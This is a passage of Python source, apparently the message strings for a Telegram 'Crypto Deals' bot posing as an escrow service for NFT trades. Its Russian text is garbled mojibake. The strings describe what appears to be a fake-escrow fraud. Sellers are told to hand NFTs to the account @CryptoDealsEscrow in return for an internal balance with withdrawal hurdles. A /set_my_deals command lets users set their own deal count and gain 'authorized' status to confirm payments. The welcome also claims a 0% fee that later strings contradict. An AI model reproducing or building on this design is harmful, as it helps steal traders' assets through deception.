            "3. –ü—Ä–æ–¥–∞–≤–µ—Ü –ø–µ—Ä–µ–¥–∞—Å—Ç —Ç–æ–≤–∞—Ä –º–µ–Ω–µ–¥–∂–µ—Ä—É\n"
            "4. –ü–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ —Å–¥–µ–ª–∫–∏\n\n"
            "üìû –ü—Ä–∏ –≤–æ–∑–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏–∏ –≤–æ–ø—Ä–æ—Å–æ–≤ –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É."
        ),
        'payment_confirmed_authorized': (
            "‚úÖ –û–ø–ª–∞—Ç–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞! –ü—Ä–æ–¥–∞–≤–µ—Ü —É–≤–µ–¥–æ–º–ª–µ–Ω –æ –≤–∞—à–µ–º –ø–ª–∞—Ç–µ–∂–µ.\n\n"
            "‚è≥ **–û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø–µ—Ä–µ–¥–∞—á–∏ NFT –æ—Ç –º–µ–Ω–µ–¥–∂–µ—Ä–∞...**\n\n"
            "üìä –í–∞—à–∞ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∞:\n"
            "‚Ä¢ –£—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫: {deals}\n\n"
            "–û–∂–∏–¥–∞–π—Ç–µ –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ–≤–∞—Ä–∞ —á–µ—Ä–µ–∑ –º–µ–Ω–µ–¥–∂–µ—Ä–∞."
        ),
        'payment_confirmation_error': "‚ö†Ô∏è –ü–ª–∞—Ç–µ–∂ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω, –Ω–æ –≤–æ–∑–Ω–∏–∫–ª–∏ –ø—Ä–æ–±–ª–µ–º—ã —Å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è–º–∏. –°–≤—è–∂–∏—Ç–µ—Å—å —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π.",

        # ---------- –°–¥–µ–ª–∫–∏ (–ø—Ä–æ–¥–∞–≤–µ—Ü) ----------
        'seller_deal_info': (
            "üìã –í–∞—à–∞ —Å–¥–µ–ª–∫–∞ #{deal_id}\n\n"
            "üìä –£—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫ —É –≤–∞—Å: {deals}\n\n"
            "üì¶ –ü—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ: {description}\n"
            "üí∞ –°—É–º–º–∞: {amount} {unit}\n"
            "üí± –í–∞–ª—é—Ç–∞: {currency}\n\n"
            "üîó –°—Å—ã–ª–∫–∞ –¥–ª—è –ø–æ–∫—É–ø–∞—Ç–µ–ª—è:\n"
            "{link}\n\n"
            "‚ÑπÔ∏è –ö–æ–≥–¥–∞ –ø–æ–∫—É–ø–∞—Ç–µ–ª—å –ø—Ä–∏—Å–æ–µ–¥–∏–Ω–∏—Ç—Å—è –∫ —Å–¥–µ–ª–∫–µ, –≤—ã –ø–æ–ª—É—á–∏—Ç–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ."
        ),
        'new_buyer_notification': (
            "üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å @{buyer}\n"
            "–ü—Ä–∏—Å–æ–µ–¥–∏–Ω–∏–ª—Å—è –∫ —Å–¥–µ–ª–∫–µ #{deal_id}\n\n"
            "{buyer_stats}\n\n"
            "‚ö†Ô∏è –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"
        ),
        'buyer_stats': "üìä –£—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫ –ø–æ–∫—É–ø–∞—Ç–µ–ª—è: {count}\n{status}",
        'authorized_status': "‚úÖ –ü—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å",
        'unauthorized_status': "‚ö†Ô∏è –ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å",

        # ---------- –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –æ–ø–ª–∞—Ç—ã –ø—Ä–æ–¥–∞–≤—Ü—É ----------
        'payment_received_seller': (
            "üí∞ –ü–õ–ê–¢–ï–ñ –ü–û–î–¢–í–ï–†–ñ–î–ï–ù!\n\n"
            "‚úÖ –ü–æ–∫—É–ø–∞—Ç–µ–ª—å @{buyer} –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª –æ–ø–ª–∞—Ç—É\n"
            "üì¶ –°–¥–µ–ª–∫–∞: #{deal_id}\n"
            "üíé –¢–æ–≤–∞—Ä: {description}\n"
            "üíµ –°—É–º–º–∞: {amount} {unit}\n\n"
            "üìä **–§–∏–Ω–∞–Ω—Å–æ–≤—ã–µ —É—Å–ª–æ–≤–∏—è:**\n"
            "‚Ä¢ –ö–æ–º–∏—Å—Å–∏—è —Å–∏—Å—Ç–µ–º—ã: {fee_percent}% ({fee:.2f} —Ä—É–±)\n"
            "‚Ä¢ –ö –∑–∞—á–∏—Å–ª–µ–Ω–∏—é –Ω–∞ –±–∞–ª–∞–Ω—Å: {net:.2f} —Ä—É–±\n\n"
            "‚ö†Ô∏è –¢–†–ï–ë–£–ï–¢–°–Ø –í–ê–®–ï –î–ï–ô–°–¢–í–ò–ï:\n"
            "1. –ü–µ—Ä–µ–¥–∞–π—Ç–µ —Ç–æ–≤–∞—Ä –º–µ–Ω–µ–¥–∂–µ—Ä—É @CryptoDealsEscrow\n"
            "2. –ü–æ—Å–ª–µ –ø–µ—Ä–µ–¥–∞—á–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ\n"
            "3. –ú–µ–Ω–µ–¥–∂–µ—Ä –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç –ø–æ–ª—É—á–µ–Ω–∏–µ NFT\n"
            "4. –°—É–º–º–∞ {net:.2f} —Ä—É–± –±—É–¥–µ—Ç –∑–∞—á–∏—Å–ª–µ–Ω–∞ –Ω–∞ –≤–∞—à –±–∞–ª–∞–Ω—Å\n\n"
            "‚ùå **–ù–µ –ø–µ—Ä–µ–¥–∞–≤–∞–π—Ç–µ —Ç–æ–≤–∞—Ä –ø–æ–∫—É–ø–∞—Ç–µ–ª—é –Ω–∞–ø—Ä—è–º—É—é!**"
        ),
        'btn_request_transfer': "üì¶ –ü–æ–¥–∞—Ç—å –∑–∞—è–≤–∫—É –Ω–∞ –ø–µ—Ä–µ–¥–∞—á—É NFT",
        'btn_cancel_deal': "‚ùå –û—Ç–º–µ–Ω–∏—Ç—å —Å–¥–µ–ª–∫—É",

        # ---------- –ó–∞—è–≤–∫–∞ –Ω–∞ –ø–µ—Ä–µ–¥–∞—á—É NFT ----------
        'transfer_request_submitted': (
            "‚úÖ –ó–ê–Ø–í–ö–ê –ù–ê –ü–ï–†–ï–î–ê–ß–£ NFT –ü–û–î–ê–ù–ê!\n\n"
            "üîó –°–¥–µ–ª–∫–∞: #{deal_id}\n"
            "üì¶ –¢–æ–≤–∞—Ä: {description}\n"
            "üí∞ –ö –∑–∞—á–∏—Å–ª–µ–Ω–∏—é: {net:.2f} —Ä—É–±\n\n"
            "üìû –ú–µ–Ω–µ–¥–∂–µ—Ä—ã —É–≤–µ–¥–æ–º–ª–µ–Ω—ã –æ –≤–∞—à–µ–π –∑–∞—è–≤–∫–µ.\n"
            "‚è≥ –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è NFT –æ—Ç –º–µ–Ω–µ–¥–∂–µ—Ä–∞.\n\n"
            "‚ÑπÔ∏è –ö–∞–∫ —Ç–æ–ª—å–∫–æ –º–µ–Ω–µ–¥–∂–µ—Ä –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç –ø–æ–ª—É—á–µ–Ω–∏–µ NFT, —Å—É–º–º–∞ {net:.2f} —Ä—É–± –±—É–¥–µ—Ç –∑–∞—á–∏—Å–ª–µ–Ω–∞ –Ω–∞ –≤–∞—à –±–∞–ª–∞–Ω—Å."
        ),
        'transfer_request_error': "‚ö†Ô∏è –ó–∞—è–≤–∫–∞ –ø–æ–¥–∞–Ω–∞, –Ω–æ –≤–æ–∑–Ω–∏–∫–ª–∏ –ø—Ä–æ–±–ª–µ–º—ã —Å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ–º –º–µ–Ω–µ–¥–∂–µ—Ä–æ–≤. –°–≤—è–∂–∏—Ç–µ—Å—å —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π.",

        # ---------- –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞–º ----------
        'manager_transfer_request': (
            "üì¶ –ó–ê–Ø–í–ö–ê –ù–ê –ü–ï–†–ï–î–ê–ß–£ NFT\n\n"
            "üîó ID —Å–¥–µ–ª–∫–∏: #{deal_id}\n"
            "üë§ –ü—Ä–æ–¥–∞–≤–µ—Ü: @{seller} (ID: {seller_id})\n"
            "üë§ –ü–æ–∫—É–ø–∞—Ç–µ–ª—å: @{buyer}\n"
            "üí∞ –°—É–º–º–∞: {amount} {unit}\n"
            "üíé –¢–æ–≤–∞—Ä: {description}\n\n"
            "üìä **–§–∏–Ω–∞–Ω—Å–æ–≤—ã–µ —É—Å–ª–æ–≤–∏—è:**\n"
            "‚Ä¢ –ö–æ–º–∏—Å—Å–∏—è: {fee:.2f} —Ä—É–± ({fee_percent}%)\n"
            "‚Ä¢ –ö –∑–∞—á–∏—Å–ª–µ–Ω–∏—é –ø—Ä–æ–¥–∞–≤—Ü—É: {net:.2f} —Ä—É–±\n\n"
            "‚ö†Ô∏è **–ü—Ä–æ–¥–∞–≤–µ—Ü –∑–∞—è–≤–∏–ª –æ –ø–µ—Ä–µ–¥–∞—á–µ NFT.**\n"
            "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–ª—É—á–µ–Ω–∏–µ NFT –∏ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –Ω–∏–∂–µ:"
        ),
        'btn_manager_confirm': "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–æ–ª—É—á–µ–Ω–∏–µ NFT",
        'btn_manager_reject': "‚ùå NFT –Ω–µ –ø–æ–ª—É—á–µ–Ω",

        # ---------- –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –º–µ–Ω–µ–¥–∂–µ—Ä–∞ ----------
        'manager_confirmed': (
            "‚úÖ –ü–ï–†–ï–î–ê–ß–ê NFT –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ê!\n\n"
            "üîó –°–¥–µ–ª–∫–∞: #{deal_id}\n"
            "üí∞ –ó–∞—á–∏—Å–ª–µ–Ω–æ –ø—Ä–æ–¥–∞–≤—Ü—É: {net:.2f} —Ä—É–±\n"
            "üë§ –ü—Ä–æ–¥–∞–≤–µ—Ü —É–≤–µ–¥–æ–º–ª–µ–Ω –æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏\n"
            "üë§ –ü–æ–∫—É–ø–∞—Ç–µ–ª—å —É–≤–µ–¥–æ–º–ª–µ–Ω –æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ —Å–¥–µ–ª–∫–∏\n\n"
            "üéâ **–°–¥–µ–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!**"
        ),
        'manager_rejected': (
            "‚ùå –ó–ê–Ø–í–ö–ê –ù–ê –ü–ï–†–ï–î–ê–ß–£ NFT –û–¢–ö–õ–û–ù–ï–ù–ê!\n\n"
            "üîó –°–¥–µ–ª–∫–∞: #{deal_id}\n\n"
            "‚ö†Ô∏è –ü—Ä–æ–¥–∞–≤–µ—Ü —É–≤–µ–¥–æ–º–ª–µ–Ω –æ–± –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏–∏.\n"
            "–û–Ω –¥–æ–ª–∂–µ–Ω –ø–µ—Ä–µ–¥–∞—Ç—å NFT –∏ —Å–Ω–æ–≤–∞ –ø–æ–¥–∞—Ç—å –∑–∞—è–≤–∫—É."
        ),
        'manager_action_error': "‚ö†Ô∏è –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø–æ–ª—É—á–µ–Ω–æ, –Ω–æ –≤–æ–∑–Ω–∏–∫–ª–∏ –ø—Ä–æ–±–ª–µ–º—ã —Å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è–º–∏.",

        # ---------- –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø–æ–∫—É–ø–∞—Ç–µ–ª—é –æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ ----------
        'buyer_deal_completed': (
            "üéâ –°–î–ï–õ–ö–ê –ó–ê–í–ï–†–®–ï–ù–ê –£–°–ü–ï–®–ù–û!\n\n"
            "‚úÖ –ú–µ–Ω–µ–¥–∂–µ—Ä –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª –ø–æ–ª—É—á–µ–Ω–∏–µ NFT –æ—Ç –ø—Ä–æ–¥–∞–≤—Ü–∞\n"
            "üë§ –ü—Ä–æ–¥–∞–≤–µ—Ü: @{seller}\n"
            "üí∞ –°—É–º–º–∞: {amount} {unit}\n"
            "üì¶ –¢–æ–≤–∞—Ä: {description}\n"
            "üîó ID —Å–¥–µ–ª–∫–∏: #{deal_id}\n\n"
            "üì¢ –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ–≤–∞—Ä–∞ –æ—Ç –º–µ–Ω–µ–¥–∂–µ—Ä–∞\n\n"
            "‚≠êÔ∏è –°–ø–∞—Å–∏–±–æ –∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ Crypto Deals!\n"
            "–í–∞—à–∞ –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç—å –ø–æ–≤—ã—à–µ–Ω–∞ –Ω–∞ 1 –ø—É–Ω–∫—Ç."
        ),

        # ---------- –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø—Ä–æ–¥–∞–≤—Ü—É –æ –∑–∞—á–∏—Å–ª–µ–Ω–∏–∏ ----------
        'seller_funds_credited': (
            "‚úÖ –ü–ï–†–ï–î–ê–ß–ê NFT –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ê –ú–ï–ù–ï–î–ñ–ï–†–û–ú!\n\n"
            "üîó –°–¥–µ–ª–∫–∞: #{deal_id}\n"
            "üì¶ –¢–æ–≤–∞—Ä: {description}\n"
            "üí∞ –°—É–º–º–∞ —Å–¥–µ–ª–∫–∏: {amount} —Ä—É–±\n"
            "üìä –ö–æ–º–∏—Å—Å–∏—è —Å–∏—Å—Ç–µ–º—ã: {fee:.2f} —Ä—É–±\n\n"
            "üí∞ **–°–†–ï–î–°–¢–í–ê –ó–ê–ß–ò–°–õ–ï–ù–´ –ù–ê –í–ê–® –ë–ê–õ–ê–ù–°!**\n"
            "üíµ –ó–∞—á–∏—Å–ª–µ–Ω–æ: {net:.2f} —Ä—É–±\n"
            "üè¶ –¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: {balance:.2f} —Ä—É–±\n\n"
            "üéâ –°–¥–µ–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!\n"
            "–ü–æ–∫—É–ø–∞—Ç–µ–ª—å —É–≤–µ–¥–æ–º–ª–µ–Ω –æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ —Å–¥–µ–ª–∫–∏.\n\n"
            "‚≠êÔ∏è –°–ø–∞—Å–∏–±–æ –∑–∞ —á–µ—Å—Ç–Ω—É—é —Ç–æ—Ä–≥–æ–≤–ª—é!\n"
            "–í–∞—à–∞ –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç—å –ø–æ–≤—ã—à–µ–Ω–∞ –Ω–∞ 1 –ø—É–Ω–∫—Ç."
        ),
        'btn_back_to_menu': "üè† –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é",

        # ---------- –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø—Ä–æ–¥–∞–≤—Ü—É –æ–± –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏–∏ ----------
        'seller_transfer_rejected': (
            "‚ùå –ó–ê–Ø–í–ö–ê –ù–ê –ü–ï–†–ï–î–ê–ß–£ NFT –û–¢–ö–õ–û–ù–ï–ù–ê\n\n"
            "üîó –°–¥–µ–ª–∫–∞: #{deal_id}\n"
            "üì¶ –¢–æ–≤–∞—Ä: {description}\n\n"
            "‚ö†Ô∏è **–ú–µ–Ω–µ–¥–∂–µ—Ä –Ω–µ –ø–æ–ª—É—á–∏–ª NFT!**\n\n"
            "üìå **–î–∞–ª—å–Ω–µ–π—à–∏–µ –¥–µ–π—Å—Ç–≤–∏—è:**\n"
            "1. –ü–µ—Ä–µ–¥–∞–π—Ç–µ NFT –º–µ–Ω–µ–¥–∂–µ—Ä—É @CryptoDealsEscrow\n"
            "2. –ü–æ—Å–ª–µ –ø–µ—Ä–µ–¥–∞—á–∏ —Å–Ω–æ–≤–∞ –Ω–∞–∂–º–∏—Ç–µ '–ü–æ–¥–∞—Ç—å –∑–∞—è–≤–∫—É –Ω–∞ –ø–µ—Ä–µ–¥–∞—á—É NFT'\n"
            "3. –ú–µ–Ω–µ–¥–∂–µ—Ä –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç –ø–æ–ª—É—á–µ–Ω–∏–µ\n"
            "4. –°—Ä–µ–¥—Å—Ç–≤–∞ –±—É–¥—É—Ç –∑–∞—á–∏—Å–ª–µ–Ω—ã –Ω–∞ –≤–∞—à –±–∞–ª–∞–Ω—Å\n\n"
            "‚ùå –ù–µ –ø–µ—Ä–µ–¥–∞–≤–∞–π—Ç–µ —Ç–æ–≤–∞—Ä –ø–æ–∫—É–ø–∞—Ç–µ–ª—é –Ω–∞–ø—Ä—è–º—É—é!"
        ),

        # ---------- –û—Ç–º–µ–Ω–∞ —Å–¥–µ–ª–∫–∏ ----------
        'deal_cancelled': "‚ùå –°–¥–µ–ª–∫–∞ #{deal_id} –æ—Ç–º–µ–Ω–µ–Ω–∞.\n–í—Å–µ —É—á–∞—Å—Ç–Ω–∏–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω—ã –æ–± –æ—Ç–º–µ–Ω–µ.",
        'buyer_deal_cancelled': "‚ùå –°–¥–µ–ª–∫–∞ #{deal_id} –±—ã–ª–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞ –ø—Ä–æ–¥–∞–≤—Ü–æ–º.",

        # ---------- –ü–æ–¥–¥–µ—Ä–∂–∫–∞ ----------
        'support_message': "–î–ª—è —Å–≤—è–∑–∏ —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:",

        # ---------- –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ ----------
        'referral_system': "–†–∞–∑–¥–µ–ª '–†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞' –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ",

        # ---------- –ö–æ–º–∞–Ω–¥—ã (—Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∏ –ø—Ä.) ----------
        'my_stats': (
            "üìä –í–ê–®–ê –°–¢–ê–¢–ò–°–¢–ò–ö–ê\n\n"
            "üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username}\n"
            "üÜî ID: {user_id}\n"
            "üíº –£—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫: {deals}\n"
            "üí∞ –ë–∞–ª–∞–Ω—Å: {balance:.2f} —Ä—É–±\n"
            "üéØ –°—Ç–∞—Ç—É—Å: {status}\n\n"
            "üí≥ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –≤—ã–≤–æ–¥–µ —Å—Ä–µ–¥—Å—Ç–≤:\n"
            "{wallet_info}\n"
            "{card_info}\n\n"
            "üìù –ü—Ä–∞–≤–∏–ª–∞ –≤—ã–≤–æ–¥–∞:\n"
            "‚Ä¢ –ú–∏–Ω–∏–º—É–º: {min_withdraw} —Ä—É–±\n"
            "{deals_requirement}"
            "‚Ä¢ –ö–æ–º–∏—Å—Å–∏—è —Å–∏—Å—Ç–µ–º—ã: {fee}%\n\n"
            "üí° –î–æ—Å—Ç—É–ø–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏:\n"
            "{functions}"
        ),
        'function_confirm_payment': "‚Ä¢ –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –æ–ø–ª–∞—Ç—ã –≤ —Å–¥–µ–ª–∫–∞—Ö",
        'function_not_available': "‚Ä¢ (–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ)",
        'function_change_stats': "‚Ä¢ –ò–∑–º–µ–Ω–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏",
        'function_view_stats': "‚Ä¢ –ü—Ä–æ—Å–º–æ—Ç—Ä —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏",
        'function_withdraw': "‚Ä¢ –í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ —Å –±–∞–ª–∞–Ω—Å–∞",
        'set_my_deals_current': "üìä –í–∞—à–µ —Ç–µ–∫—É—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —É—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫: {deals}\n\n–ß—Ç–æ–±—ã —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –Ω–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ:\n`/set_my_deals 10`",
        'set_my_deals_success': "‚úÖ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —É—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ: {deals}\n\nüìä –¢–µ–ø–µ—Ä—å –≤–∞—à–∞ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:\n‚Ä¢ –£—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫: {deals}\n‚Ä¢ –°—Ç–∞—Ç—É—Å: ‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω\n\nüì¢ –≠—Ç–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –±—É–¥–µ—Ç –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å—Å—è –ø—Ä–æ–¥–∞–≤—Ü–∞–º, –∫–æ–≥–¥–∞ –≤—ã –±—É–¥–µ—Ç–µ –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–º –≤ —Å–¥–µ–ª–∫–µ!",
        'set_my_deals_negative': "‚ùå –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–¥–µ–ª–æ–∫ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–º",
        'set_my_deals_invalid': "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —á–∏—Å–ª–∞. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ, –Ω–∞–ø—Ä–∏–º–µ—Ä: `/set_my_deals 15`",

        # ---------- –û–±—â–∏–µ –æ—à–∏–±–∫–∏ ----------
        'error_occurred': "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.",
        'deal_not_found': "‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –∏–ª–∏ –±—ã–ª–∞ —É–¥–∞–ª–µ–Ω–∞",
        'not_seller': "‚ùå –í—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –ø—Ä–æ–¥–∞–≤—Ü–æ–º –≤ —ç—Ç–æ–π —Å–¥–µ–ª–∫–µ",
        'not_buyer': "‚ùå –í—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–º –≤ —ç—Ç–æ–π —Å–¥–µ–ª–∫–µ",
        'not_authorized': (
            "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—é –æ–ø–ª–∞—Ç\n\n"
            "–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ —Å–≤—è–∂–∏—Ç–µ—Å—å —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π."
        ),
        'buy_command_usage': (
            "‚ùå –ö–æ–º–∞–Ω–¥–∞ /buy –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–π –≤ –∞–∫—Ç–∏–≤–Ω–æ–π —Å–¥–µ–ª–∫–µ\n\n"
            "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ:\n"
            "`/buy deal_id`\n\n"
            "–≥–¥–µ deal_id - ID —Å–¥–µ–ª–∫–∏, –≤ –∫–æ—Ç–æ—Ä–æ–π –≤—ã —è–≤–ª—è–µ—Ç–µ—Å—å –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–º."
        ),
    },

    # ------------------ –ê–ù–ì–õ–ò–ô–°–ö–ê–Ø –í–ï–†–°–ò–Ø ------------------
    LANG_EN: {
        'welcome': (
            "Welcome üëã\n\n"
            "üíº Crypto Deals - We are a specialized service for ensuring the security of over-the-counter transactions.\n\n"
            "‚ú® Automated execution algorithm.\n"
            "‚ö°Ô∏è Speed and automation.\n"
            "üí≥ Convenient and fast withdrawal of funds.\n\n"
            "‚Ä¢ Service fee: 0%\n"
            "‚Ä¢ Working hours: 24/7\n"
            "‚Ä¢ Technical support: @CryptoDealsEscrow\n\n"
            "üõ°Ô∏è Choose the desired section below:"
        ),
        'choose_language': "üåê Please choose your language:",
        'language_selected': "‚úÖ Language set: English",
        'back_to_menu': "üîô Back to menu",

        'btn_manage_requisites': "üì©Manage requisites",
        'btn_create_deal': "üìùCreate deal",
        'btn_my_balance': "üí∞My balance",
        'btn_referral': "üîóReferral system",
        'btn_support': "üìûSupport",

        'manage_requisites': "üì• Manage requisites\n\nUse the buttons below to add/change requisitesüëá",
        'btn_add_wallet': "ü™ôAdd/change TON Wallet",
        'btn_add_card': "üí≥Add/change card",

        'create_deal_prompt': "üí∞Choose payment method:",
        'btn_deal_ton': "üíéTo TON wallet",
        'btn_deal_card': "üí≥To card",
        'btn_deal_stars': "‚≠êÔ∏èStars",
        'enter_amount': "üíº Creating a deal\n\nEnter amount in {unit} (e.g., 100.5):",
        'enter_description': "üìù Describe what you are offering in this deal for {amount} {unit}:\n\nExample: 10 Caps and Pepes...",
        'invalid_amount': "‚ùå Invalid amount format. Use format like 100.5 {unit}",
        'deal_created': (
            "‚úÖ Deal successfully created!\n\n"
            "üí∞ Amount: {amount} {unit}\n"
            "üí± Currency: {currency}\n"
            "üìú Description: {description}\n"
            "üîó Link for buyer:\n"
            "{link}\n\n"
            "Copy the link and send it to the buyer."
        ),

        'my_balance': (
            "üí∞ YOUR BALANCE\n\n"
            "üë§ User: @{username}\n"
            "üíµ Balance: {balance:.2f} RUB\n\n"
            "üí≥ Withdrawal information:\n"
            "{wallet_info}\n"
            "{card_info}\n\n"
            "üìã **Information:**\n"
            "‚Ä¢ System fee: {fee}%\n"
            "‚Ä¢ Min withdrawal: {min_withdraw} RUB\n"
            "{deals_requirement}"
            "‚Ä¢ Withdrawal available to card or TON wallet\n\n"
            "üíº Successful deals: {deals}"
        ),
        'btn_withdraw': "üí≥ Withdraw funds",
        'btn_history': "üìä Transaction history",
        'withdraw_funds': (
            "üí∞ WITHDRAWAL\n\n"
            "üíµ Available: {balance:.2f} RUB\n"
